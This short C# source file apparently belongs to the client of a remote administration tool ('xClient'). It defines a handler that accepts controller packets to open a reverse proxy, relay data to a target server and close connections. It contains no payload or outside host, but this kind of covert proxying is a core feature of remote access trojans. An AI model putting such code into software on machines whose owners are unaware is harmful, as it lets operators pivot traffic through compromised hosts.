using System;
using System.Collections.Generic;
using System.Text;
using xClient.Core.Packets;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.ReverseProxy
{
    public class ReverseProxyCommandHandler
    {
        public static void HandleCommand(Client client, IPacket Packet)
        {
            if (Packet as ReverseProxy_Connect != null)
            {
                ReverseProxy_Connect ConnectCommand = Packet as ReverseProxy_Connect;
                client.ConnectReverseProxy(ConnectCommand);
            }
            else if (Packet as ReverseProxy_Data != null)
            {
                ReverseProxy_Data DataCommand = Packet as ReverseProxy_Data;
                ReverseProxyClient proxyClient = client.GetReverseProxyByConnectionId(DataCommand.ConnectionId);

                if (proxyClient != null)
                {
                    proxyClient.SendToTargetServer(DataCommand.Data);
                }
            }
            else if (Packet as ReverseProxy_Disconnect != null)
            {
                ReverseProxy_Disconnect DisconnectCommand = Packet as ReverseProxy_Disconnect;
                ReverseProxyClient SocksClient = client.GetReverseProxyByConnectionId(DisconnectCommand.ConnectionId);

                if (SocksClient != null)
                {
                    SocksClient.Disconnect();
                }
            }
        }
    }
}